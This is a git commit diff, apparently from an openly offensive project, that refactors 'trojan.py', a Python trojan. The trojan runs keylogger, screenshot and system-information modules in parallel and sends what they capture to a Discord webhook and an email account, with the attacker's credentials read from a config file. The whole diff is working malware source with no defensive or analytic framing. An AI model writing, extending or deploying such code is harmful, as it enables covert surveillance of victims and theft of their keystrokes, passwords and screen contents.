05e2369b98c6db52d80f6ad90f61d879f0043bd9
EONRaider <livewire_voodoo@protonmail.com>
2021-10-26 16:14:31 -0300

    Add trojan.py

--- trojan.py
+++ trojan.py
@@ -3,37 +3,48 @@
 
 __author__ = "EONRaider @ keybase.io/eonraider"
 
-import os
 from concurrent.futures import ThreadPoolExecutor
+from configparser import ConfigParser
 from pathlib import Path
-from typing import Union
 
 from src.modules.exfiltration import Discord, Email
 from src.modules.exploitation import KeyLogger, ScreenShot, SystemInformation
 
-import dotenv
+
+class ConfigFile:
+    def __init__(self):
+        self.cfg = ConfigParser()
+        self.cfg.read(Path(__file__).parent.joinpath("trojan.cfg"))
+        self.setup = self.cfg["Setup"]
+        self.discord = self.cfg["Discord"]
+        self.email = self.cfg["Email"]
 
 
-dotenv.load_dotenv()
+class Trojan(object):
+    def __init__(self):
+        self.cfg = ConfigFile()
 
+    @property
+    def modules(self):
+        return {
+            KeyLogger(exfil_time=self.cfg.setup.getint("ExfiltrationTime")),
+            ScreenShot(image_path=self.cfg.setup["ScreenshotFile"],
+                       exfil_time=self.cfg.setup.getint("ExfiltrationTime")),
+            SystemInformation()
+        }
 
-def bca_trojan(*, exfil_time: float,
-               screenshot: Union[str, Path]) -> None:
-    keylogger = KeyLogger(exfil_time=exfil_time)
-    screenshot = ScreenShot(image_path=screenshot, exfil_time=exfil_time)
-    sysinfo = SystemInformation()
-
-    with ThreadPoolExecutor() as executor:
-        for module in screenshot, sysinfo, keylogger:
-            Discord(module=module,
-                    webhook_url=os.getenv("WEBHOOK_URL"))
-            Email(module=module,
-                  smtp_host=os.getenv("EMAIL_HOST"),
-                  smtp_port=int(os.getenv("EMAIL_PORT")),
-                  email=os.getenv("EMAIL_USERNAME"),
-                  password=os.getenv("EMAIL_PASSWORD"))
-            executor.submit(module.execute)
+    def execute(self):
+        with ThreadPoolExecutor() as executor:
+            for module in self.modules:
+                Discord(module=module,
+                        webhook_url=self.cfg.discord["Webhook"])
+                Email(module=module,
+                      smtp_host=self.cfg.email["Host"],
+                      smtp_port=self.cfg.email.getint("Port"),
+                      email=self.cfg.email["Username"],
+                      password=self.cfg.email["Password"])
+                executor.submit(module.execute)
 
 
 if __name__ == "__main__":
-    bca_trojan(exfil_time=30, screenshot="/tmp/screenshot.png")
+    (trojan := Trojan()).execute()
